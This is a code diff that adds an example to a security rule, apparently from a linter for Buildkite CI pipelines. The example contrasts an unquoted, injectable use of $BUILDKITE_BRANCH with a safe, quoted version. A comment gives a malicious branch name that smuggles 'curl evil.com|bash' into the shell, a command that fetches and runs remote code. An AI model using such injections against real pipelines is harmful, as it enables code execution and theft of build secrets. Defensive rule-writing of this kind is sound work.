@@ -44,6 +44,27 @@ RULE = Rule(
         "you've verified the script handles untrusted argv "
         "safely (or quote the use, which is the better fix).",
     ),
+    exploit_example=(
+        "# Vulnerable: an MR whose branch is named\n"
+        "# ``feat;curl evil.com|bash;#`` lands the metacharacters\n"
+        "# into the shell verbatim. The injected ``curl`` runs in\n"
+        "# the build's shell context with the step's full secret\n"
+        "# set in scope.\n"
+        "steps:\n"
+        "  - command: |\n"
+        "      echo \"Building $BUILDKITE_BRANCH\"\n"
+        "      ./build.sh --branch $BUILDKITE_BRANCH\n"
+        "\n"
+        "# Safe: assign the untrusted value to a local shell\n"
+        "# variable, quote it on every use, and pass it as an\n"
+        "# argument to a script you own. The shell sees one\n"
+        "# argument; injected metacharacters stay literal.\n"
+        "steps:\n"
+        "  - command: |\n"
+        "      branch=\"$BUILDKITE_BRANCH\"\n"
+        "      echo \"Building $branch\"\n"
+        "      ./build.sh --branch \"$branch\""
+    ),
 )
 
 # Buildkite-managed variables that are attacker-controllable through a
